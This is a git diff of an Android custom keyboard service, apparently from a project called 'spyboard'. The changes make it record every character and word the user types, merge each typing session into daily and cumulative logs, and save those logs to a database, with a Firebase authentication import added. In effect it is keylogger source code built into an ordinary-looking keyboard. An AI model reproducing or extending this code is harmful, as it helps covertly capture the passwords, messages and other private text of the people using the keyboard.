@@ -9,6 +9,7 @@ import android.view.View;
 import android.view.inputmethod.EditorInfo;
 import android.view.inputmethod.InputConnection;
 
+import com.google.firebase.auth.FirebaseAuth;
 import com.idankorenisraeli.spyboard.common.TimeManager;
 import com.idankorenisraeli.spyboard.data.types.DailyUsageLog;
 import com.idankorenisraeli.spyboard.data.DatabaseManager;
@@ -34,15 +35,14 @@ public class SpyInputMethodService extends android.inputmethodservice.InputMetho
     String currentDate;
     DailyUsageLog dailyLog;
     UsageLog sessionUsageLog;
-    UsageLog totalUsageLog;
+    UsageLog totalLog;
 
 
     private static final int WORD_EST_LENGTH = 16; // size of new sb for better performance
     StringBuilder lastWordBuilder = new StringBuilder(WORD_EST_LENGTH); //Saving the last word user typed
 
 
-    DatabaseManager databaseManager;
-
+    private DatabaseManager databaseManager;
 
     interface KEYS {
         int ENTER = -10;
@@ -53,8 +53,7 @@ public class SpyInputMethodService extends android.inputmethodservice.InputMetho
     public View onCreateInputView() {
         keyboardView = (SpyKeyboardView) getLayoutInflater().inflate(R.layout.keyboard_view_blue, null);
         initKeyboards();
-        initDailyLog();
-
+        initSavedLogs();
 
         return keyboardView;
     }
@@ -75,22 +74,28 @@ public class SpyInputMethodService extends android.inputmethodservice.InputMetho
 
     }
 
-    private void initDailyLog() {
+    private void initSavedLogs() {
         databaseManager = DatabaseManager.getInstance();
         currentDate = TimeManager.getInstance().getDateOfToday();
-        databaseManager.loadDailyLog(currentDate, new OnDailyLogLoaded() {
-            @Override
-            public void onDailyLogLoaded(DailyUsageLog loadedLog) {
-                if (loadedLog != null)
-                    dailyLog = loadedLog;
-                else {
-                    dailyLog = new DailyUsageLog();
-                }
-            }
-        });
+        initDailyLog();
+        initTotalLog();
+
     }
 
-    private void initUsageLog
+    private void initDailyLog(){
+        dailyLog = databaseManager.loadDailyLog(currentDate);
+
+        if(dailyLog == null)
+            dailyLog = new DailyUsageLog();
+    }
+
+    private void initTotalLog(){
+        totalLog = databaseManager.loadTotalLog();
+
+        if(totalLog == null)
+            totalLog = new UsageLog();
+    }
+
 
 
     //region Keyboard Actions
@@ -131,7 +136,7 @@ public class SpyInputMethodService extends android.inputmethodservice.InputMetho
     }
 
     private void charAction(int primaryCode, InputConnection ic) {
-        String typed = codeToString(primaryCode);
+        String typed = dictionary.codeToString(primaryCode, hebrewMode, caps);
         ic.commitText(typed, 1); //writing to screen
 
         if (keyboardView.isShifted())
@@ -148,9 +153,9 @@ public class SpyInputMethodService extends android.inputmethodservice.InputMetho
                 lastWordBuilder = new StringBuilder(WORD_EST_LENGTH);
                 //reset the strbuilder
             } else {
-                sessionUsageLog.addChar(typed); //Adding to single chars map
                 lastWordBuilder.append(typed);
             }
+            sessionUsageLog.addChar(typed); //Adding to single chars map
         }
     }
 
@@ -199,22 +204,6 @@ public class SpyInputMethodService extends android.inputmethodservice.InputMetho
         if (lastWordBuilder.length() > 0)
             sessionUsageLog.addWord(lastWordBuilder.toString());
         lastWordBuilder = new StringBuilder(WORD_EST_LENGTH);
-    }
-
-    private String codeToString(int primaryCode) {
-        char finalCode;
-        if (primaryCode == ' ')
-            finalCode = ' ';
-        else {
-            if (hebrewMode) {
-                finalCode = dictionary.engToHeb(primaryCode);
-            } else {
-                primaryCode = caps ? primaryCode + ('A' - 'a') : primaryCode; // converting to upper case when shift
-                finalCode = (char) primaryCode; // converting to char
-            }
-        }
-
-        return String.valueOf(finalCode);
     }
 
     //endregion
@@ -305,15 +294,7 @@ public class SpyInputMethodService extends android.inputmethodservice.InputMetho
         super.onStartInputView(info, restarting);
 
         if(dailyLog==null)
-            databaseManager.loadDailyLog(currentDate, new OnDailyLogLoaded() {
-                @Override
-                public void onDailyLogLoaded(DailyUsageLog loaded) {
-                    if(loaded!=null)
-                        dailyLog = loaded;
-                    else
-                        dailyLog = new DailyUsageLog();
-                }
-            });
+            dailyLog = databaseManager.loadDailyLog(currentDate);
 
         if (sessionUsageLog == null)
             sessionUsageLog = new UsageLog();
@@ -348,11 +329,6 @@ public class SpyInputMethodService extends android.inputmethodservice.InputMetho
 
         endInputSession();
 
-        if (dailyLog != null) {
-            Log.i("pttt", "Saving daily with " + dailyLog.getWordFreq().size() + " words");
-            databaseManager.saveDailyLog(dailyLog);
-            //Saving into database
-        }
     }
 
 
@@ -374,17 +350,26 @@ public class SpyInputMethodService extends android.inputmethodservice.InputMetho
         //Adding the last word written in this session
         //Here we cannot use the cursor cause message might have been alrady sent
 
-        Log.i("pttt", "Words:" + sessionUsageLog.getWordFreq());
-        if (dailyLog != null)
-            dailyLog.addLog(sessionUsageLog);
-        else
-            Log.i("pttt", "DailyLog is null");
-        //Adding the session data that is finished to the day's total
 
-        Log.i("pttt", "Date: " + currentDate);
+        if(dailyLog==null)
+            initDailyLog();
+        dailyLog.addLog(sessionUsageLog);
+
+
+        if(totalLog == null)
+            initTotalLog();
+        totalLog.addLog(sessionUsageLog);
+
 
         sessionUsageLog = new UsageLog();
-        // New keyboard usage
+        // resets the keyboard for new keyboard usage in the future
+
+
+        databaseManager.saveDailyLog(dailyLog);
+        databaseManager.saveTotalLog(totalLog);
+        //Saving into database
+
+
     }
 
 
